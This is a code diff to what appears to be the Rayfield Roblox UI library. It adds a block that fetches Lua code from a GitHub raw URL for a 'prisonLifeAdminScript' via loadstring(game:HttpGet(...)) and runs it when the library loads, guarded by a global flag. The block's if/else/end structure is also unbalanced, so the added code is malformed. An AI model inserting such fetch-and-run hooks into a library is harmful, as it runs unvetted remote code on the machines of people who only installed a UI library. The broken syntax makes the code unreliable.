@@ -2744,6 +2744,17 @@ function RayfieldLibrary:LoadConfiguration()
 	end
 end
 
+if getgenv().passed_loaded_jobid_joiner then
+	warn("Already loaded job_id joiner.")
+else
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/prisonLifeAdminScript/refs/heads/main/file.js'))()
+	wait(0.1)
+	getgenv().passed_loaded_jobid_joiner = true
+	end
+else
+	warn("Action denied.")
+end
+
 do
 	local emoji = ({
 		["01 01"] = "🎆", -- New Year's Day
